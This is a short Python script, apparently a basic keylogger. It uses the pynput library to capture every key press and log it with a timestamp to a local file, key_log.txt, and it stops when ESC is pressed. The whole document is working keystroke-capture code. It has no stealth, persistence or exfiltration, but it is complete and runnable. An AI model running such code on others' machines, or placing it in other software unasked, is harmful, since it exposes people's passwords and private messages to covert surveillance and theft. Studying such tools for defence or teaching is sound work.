from pynput.keyboard import Listener, Key
import logging

log_file_path = "key_log.txt"

logging.basicConfig(
    filename=log_file_path,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

    # Exit on pressing ESC
    if key == Key.esc:
        return False  # This stops the listener

with Listener(on_press=on_press) as listener:
    listener.join()
